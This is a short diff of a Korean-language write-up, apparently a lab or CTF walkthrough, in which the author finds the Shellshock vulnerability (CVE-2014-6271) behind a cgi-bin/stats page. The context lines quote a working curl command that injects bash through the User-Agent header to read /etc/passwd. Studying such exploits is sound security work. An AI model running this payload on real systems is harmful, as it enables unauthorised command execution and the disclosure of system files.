@@ -71,7 +71,7 @@ Sun Nov 18 14:11:01 UTC 2018
 
 그래서 구글에 `cgi-bin/stats exploit`라고 검색 해 보았는데 깃허브에서 이와 관련 된 `CVE`를 찾을 수 있었다.  
 
-[CVE-2014-6271](https://github.com/hmlio/vaas-cve-2014-6271)
+> [CVE-2014-6271](https://github.com/hmlio/vaas-cve-2014-6271)
 
 해당 취약점을 가지고 있는 `Debian Linux system`에서 `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://your-ip:8080/cgi-bin/stats`와 같은 코드를 사용 해 임의의 코드를 실행할 수 있다.  
 
